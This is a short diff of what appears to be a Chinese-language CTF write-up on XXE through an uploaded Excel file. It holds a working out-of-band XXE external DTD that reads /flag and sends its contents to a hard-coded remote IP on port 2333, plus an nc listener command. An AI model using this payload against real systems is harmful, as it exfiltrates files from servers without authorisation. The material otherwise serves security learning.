@@ -246,7 +246,7 @@ if (filename.startsWith("excel-") && "xlsx".equals(fileExtName)) {
 进入远程服务器WEB根目录，创建文件xxx.dtd，添加内容
 ```
 <!ENTITY % file SYSTEM "file:///flag">
-<!ENTITY % int "<!ENTITY % send SYSTEM '远程服务器IP:2333/%file;'>">
+<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://47.109.58.205:2333/%file;'>">
 ```
 启动监控 ：nc -lvvp 2333
 
